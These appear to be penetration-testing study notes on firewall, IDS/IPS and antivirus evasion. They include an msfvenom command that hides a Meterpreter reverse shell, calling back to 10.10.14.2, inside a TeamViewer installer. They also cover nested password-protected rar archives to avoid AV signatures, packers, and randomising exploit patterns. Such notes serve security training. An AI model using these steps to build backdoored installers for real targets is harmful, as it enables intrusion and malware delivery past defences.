## **Firewall and IDS/IPS Evasion**

#### **Endpoint Protection**

 `Endpoint protection` refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).

#### **Perimeter Protection**

`Perimeter protection` usually comes in physical or virtualized devices on the network perimeter edge. These `edge devices` themselves provide access `inside` of the network from the `outside`, in other terms, from `public` to `private`.

**DMZ (Demilitarized Zone)**:

- Lower security than the internal network
- Higher trust than the Internet
- Usually contains **public-facing servers**
- Allows those servers to communicate with Internet users while still being managed from the internal network.

#### **Security Policies**

Security policies are basically allow/deny rules, similar to ACLs. They determine what traffic or files are allowed or denied.

There are multiple ways to match an event or object with a security policy entry:

| **Security Policy** | **Description** |
| --- | --- |
| `Signature-based Detection` | The
 operation of packets in the network and comparison with pre-built and 
pre-ordained attack patterns known as signatures. Any 100% match against
 these signatures will generate alarms. |
| `Heuristic / Statistical Anomaly Detection` | Behavioral
 comparison against an established baseline included modus-operandi 
signatures for known APTs (Advanced Persistent Threats). The baseline 
will identify the norm for the network and what protocols are commonly 
used. Any deviation from the maximum threshold will generate alarms. |
| `Stateful Protocol Analysis Detection` | Recognizing
 the divergence of protocols stated by event comparison using pre-built 
profiles of generally accepted definitions of non-malicious activity. |
| `Live-monitoring and Alerting (SOC-based)` | A
 team of analysts in a dedicated, in-house, or leased SOC (Security 
Operations Center) use live-feed software to monitor network activity 
and intermediate alarming systems for any potential threats, either 
deciding themselves if the threat should be actioned upon or letting the
 automated mechanisms take action instead. |

#### **Evasion Techniques**

**Signature-Based AV**

Most host-based anti-virus software nowadays relies mainly on `Signature-based Detection` to identify aspects of malicious code present in a software sample. AV commonly searches files and running processes for known malicious signatures. If a match is found, the AV may:

```
Malicious file
     ↓
Signature match
     ↓
Quarantine / Kill process
```

Simply encoding a payload multiple times is not enough against modern AV.

**AES-Encrypted Meterpreter Communication**

Modern `msfconsole` can establish AES-encrypted communication between Meterpreter and the attacker. This helps against network-based IDS/IPS inspection. However, strict network rules may still block connections based on things such as the source IP.

```
Meterpreter
     ↓
AES encryption
     ↓
Encrypted network traffic
     ↓
Harder for network IDS/IPS to inspect
```

#### **Executable Templates**

Even if communication is encrypted, the payload file can still be detected before execution because AV can fingerprint the file. `msfvenom` supports executable templates.A payload can be embedded into a legitimate executable such as an installer or program. This creates a: Backdoored executable

```
Legitimate EXE
     +
Payload
     ↓
Backdoored EXE
```

This can obfuscate the payload and potentially reduce detection.

### Example

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=10.10.14.2 LPORT=8080 \
-k -x ~/Downloads/TeamViewer_Setup.exe \
-e x86/shikata_ga_nai \
-a x86 --platform windows \
-o ~/Desktop/TeamViewer_Setup.exe \
-i 5
```

Important options:

```
-x  → executable template
-k  → continue normal executable execution
-e  → encoder
-i  → encoder iterations
-o  → output file
```

The example uses 5 iterations of `x86/shikata_ga_nai`.`k` attempts to keep the original application's normal execution while the payload runs separately. Without it, a backdoored executable may appear to do nothing, which can raise suspicion.

#### **Archives**

Putting a payload inside a password-protected archive can bypass many common AV signatures because the AV may be unable to inspect the locked contents. However: AV may generate an alert because it cannot scan the password-protected archive.

**Example process**

```
Payload
  ↓
Password-protected archive
  ↓
Remove extension
  ↓
Archive again
  ↓
Remove extension again
```

The example uses `rar`:

```
rar a ~/test.rar-p ~/test.jsmv test.rar test

rar a test2.rar-p testmv test2.rar test2
```

The final file is `test2` without the `.rar` extension.

#### **Why?**

```
test.js
  ↓
Password-protected archive
  ↓
AV can't easily inspect contents
  ↓
Potentially fewer signature detections
```

In the document's VirusTotal example, the original `test.js` was detected by **11/59**, while the final `test2` archive was detected by **0/49**.

#### **VirusTotal**

`msf-virustotal` can upload a generated file to VirusTotal and provide a detection report.

```
msf-virustotal -k <API key> -f test.js
```

It provides: MD5 , SHA1 , SHA256 , Analysis link , AV detection results

⚠️ Uploading a file to VirusTotal means the submitted content is subject to VirusTotal's terms and licensing conditions, as shown in the document.

#### **Packers**

A packer performs executable compression. It combines:

```
Executable
+
Payload
+
Decompression code
       ↓
   Packed file
```

When executed, the decompression code restores the executable to its original state. This can add another layer against **file-scanning mechanisms** while retaining the original functionality. `msfvenom` can also compress/change the file structure and encrypt the underlying process structure.

#### **Exploit Coding**

Exploit code itself can be detected by IDS/IPS signatures.For example, a Buffer Overflow exploit may contain recognizable hexadecimal patterns.

**Randomization**

Randomizing exploit patterns can make them less recognizable to signature-based detection. The document gives an example using an **`Offset`** value:

```
'Targets' =>
[
    [ 'Windows 2000 SP4 English',
      { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
]
```

**NOP Sleds**

Avoid obvious NOP sled patterns because IDS/IPS can also inspect them.

```
Buffer Overflow
      ↓
   NOP sled
      ↓
   Shellcode
```

The document recommends testing custom exploit code in a sandbox before using it on a client network.
